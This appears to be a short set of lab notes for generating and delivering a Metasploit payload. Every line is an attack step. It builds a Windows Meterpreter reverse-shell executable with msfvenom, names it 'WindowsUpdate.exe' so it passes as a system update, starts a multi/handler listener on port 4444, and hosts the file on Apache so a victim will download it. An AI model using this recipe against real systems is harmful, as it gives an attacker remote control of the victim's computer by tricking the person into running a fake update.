#creates payload
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.##.## LPORT=4444 -o ~/Desktop/WindowsUpdate.exe
# Start listener 
msfconsole
use Multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.13.149
set LPORT 4444
exploit
# put payload onto apache2 webserver in kali 
cp WindowsUpdate.exe /var/www/html
service apache2 start
On the windows machine surf to http://<kali-ip>/WindowsUpdate.exe to download the file
